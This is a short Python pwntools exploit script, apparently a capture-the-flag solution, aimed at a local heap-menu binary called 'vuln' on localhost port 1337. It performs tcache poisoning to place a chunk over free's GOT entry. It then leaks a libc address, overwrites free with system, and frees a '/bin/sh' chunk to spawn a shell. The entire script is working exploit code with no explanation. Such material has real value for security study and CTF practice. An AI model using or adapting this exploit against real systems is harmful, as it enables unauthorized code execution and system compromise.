from pwn import *

elf = ELF("./vuln")
libc = ELF("./libc.so.6")

r = remote("localhost", 1337)


def add(idx, size, data):
    r.recvuntil(b"> ")
    r.sendline(b"1")
    r.recvuntil(b"size: ")
    r.sendline(str(size))
    r.recvuntil(b"idx: ")
    r.sendline(str(idx))
    r.recvuntil(b"message: ")
    r.send(data)


def edit(idx, data):
    r.recvuntil(b"> ")
    r.sendline(b"4")
    r.recvuntil(b"idx: ")
    r.sendline(str(idx))
    r.recvuntil(b"message: ")
    r.send(data)


def delete(idx):
    r.recvuntil(b"> ")
    r.sendline(b"3")
    r.recvuntil(b"idx: ")
    r.sendline(str(idx))


def show(idx):
    r.recvuntil(b"> ")
    r.sendline(b"2")
    r.recvuntil(b"idx: ")
    r.sendline(str(idx))
    r.recvuntil(f"[{idx}] ")
    return r.recvline().strip()


for _ in range(2):
    add(_, 128, b"A" * 8)

for _ in range(2):
    delete(_)

edit(1, p64(elf.got['free'] - 0x10))
add(2, 128, b"B" * 8)
add(3, 128, b"C" * 0x10)

free_libc = u64(show(3)[0x10:].ljust(8, b'\x00'))
libc_base = free_libc - libc.symbols['free']
log.info("libc_base leaked --> %s", hex(libc_base))
edit(3, b"C" * 0x10 + p64(libc_base + libc.symbols['system']))
add(4, 32, b'/bin/sh\x00')
delete(4)
r.interactive()
